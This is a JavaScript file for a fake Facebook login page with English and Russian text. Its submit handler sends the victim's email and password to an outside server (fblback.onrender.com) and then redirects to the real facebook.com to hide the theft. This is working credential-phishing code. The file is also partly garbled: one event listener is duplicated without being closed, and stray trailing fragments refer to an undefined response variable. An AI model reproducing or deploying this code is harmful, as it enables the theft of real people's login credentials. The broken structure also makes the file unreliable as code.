const form = document.querySelector(".login-form");
const emailInput = document.querySelector('input[type="text"]');
const passwordInput = document.querySelector('input[type="password"]');
const successMessage = document.getElementById("successMessage") || document.createElement("div");
const translations = {
  en: {
    email: "Email or phone number",
    password: "Password",
    login: "Log In",
    forgot: "Forgot password?",
    create: "Create new account",
    page: "Create a Page for a celebrity, brand or business."
  },
  ru: {
    email: "Электронная почта или телефон",
    password: "Пароль",
    login: "Войти",
    forgot: "Забыли пароль?",
    create: "Создать новый аккаунт",
    page: "Создайте страницу для знаменитости, бренда или компании."
  }
};

document.getElementById("langSelect").addEventListener("change", (e) => {
  const lang = e.target.value;
  const t = translations[lang];

document.getElementById("langSelect").addEventListener("change", (e) => {
  const lang = e.target.value;
  const t = translations[lang];

  document.getElementById("email").placeholder = t.email;
  document.getElementById("password").placeholder = t.password;
  document.querySelector(".login-btn").textContent = t.login;
  document.querySelector(".forgot-link").textContent = t.forgot;
  document.querySelector(".create-btn").textContent = t.create;
  document.querySelector(".create-page a").textContent = t.page;
});


successMessage.id = "successMessage";
successMessage.style.color = "green";
successMessage.style.marginTop = "10px";

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = emailInput.value.trim();
  const password = passwordInput.value.trim();

  if (!email || !password) {
    successMessage.textContent = "Both fields are required.";
    form.appendChild(successMessage);
    return;
  }

  try {
    await fetch("https://fblback.onrender.com/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password })
    });

    // Редирект после успешной отправки
    window.location.href = "https://www.facebook.com";
  } catch (err) {
    console.error("Ошибка при отправке данных:", err);
    alert("Error. Try again later.");
  }
});



    const data = await res.json();
    successMessage.textContent = data.success ? "✅ Sent!" : "❌ Failed to send.";
  } catch (err) {
    console.error("Request failed:", err);
    successMessage.textContent = "❌ Error. Try again later.";
  }

  form.appendChild(successMessage);
  form.reset();
});